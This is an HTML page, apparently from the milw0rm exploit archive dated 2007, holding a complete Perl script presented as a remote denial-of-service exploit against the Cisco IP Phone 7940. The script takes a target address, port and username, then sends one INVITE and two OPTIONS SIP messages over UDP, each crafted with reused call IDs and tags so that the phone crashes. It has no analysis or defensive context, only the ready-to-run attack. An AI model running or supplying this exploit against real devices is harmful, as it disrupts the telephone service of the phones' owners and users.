<html><head><title>Cisco IP Phone 7940 (3 SIP messages) Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket::INET;

die &quot;Usage $0 &lt;dst&gt; &lt;port&gt; &lt;username&gt;&quot; unless ($ARGV[2]);

 

$socket=new IO::Socket::INET-&gt;new(PeerPort=&gt;$ARGV[1],

        Proto=&gt;'udp',

        PeerAddr=&gt;$ARGV[0]);

 

$msg = &quot;INVITE sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP\t192.168.1.2;rport;branch=00\r\nFrom: &lt;sip:gasparin\@192.168.1.2&gt;;tag=00\r\nTo: &lt;sip:$ARGV[2]\@$ARGV[0]&gt;;tag=00\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 10 INVITE\r\nContent-Length: 0\r\n\r\n&quot;;;

$socket-&gt;send($msg);

 

sleep(1);

$msg =&quot;OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;rport;branch=01\r\nFrom: &lt;sip:gasparin\@192.168.1.2&gt;;tag=01\r\nTo: &lt;sip:$ARGV[2]\@$ARGV[0]&gt;\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 11 OPTIONS\r\nContent-Length: 0\r\n\r\n&quot;;

$socket-&gt;send($msg);

 

sleep(1);

$msg =&quot;OPTIONS sip:$ARGV[2]\@$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.2;rport;branch=02\r\nFrom: &lt;sip:gasparin\@192.168.1.2&gt;;tag=02\r\nTo: &lt;sip:$ARGV[2]\@$ARGV[0]&gt;\r\nCall-ID: et\@192.168.1.2\r\nCSeq: 12 OPTIONS\r\nContent-Length: 0\r\n\r\n&quot;;

$socket-&gt;send($msg);

# milw0rm.com [2007-08-21]</pre></html>